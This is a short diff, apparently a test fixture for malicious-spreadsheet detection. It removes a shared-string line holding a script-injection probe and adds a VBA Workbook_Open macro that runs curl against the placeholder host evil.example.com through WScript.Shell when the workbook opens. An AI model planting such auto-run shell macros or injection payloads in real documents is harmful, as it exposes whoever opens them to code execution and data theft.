@@ -1,1 +1,3 @@
-<si><t><!-- hidden content --><script>alert(1)</script></t></si>
+Private Sub Workbook_Open()
+  CreateObject("WScript.Shell").Run "curl http://evil.example.com/"
+End Sub
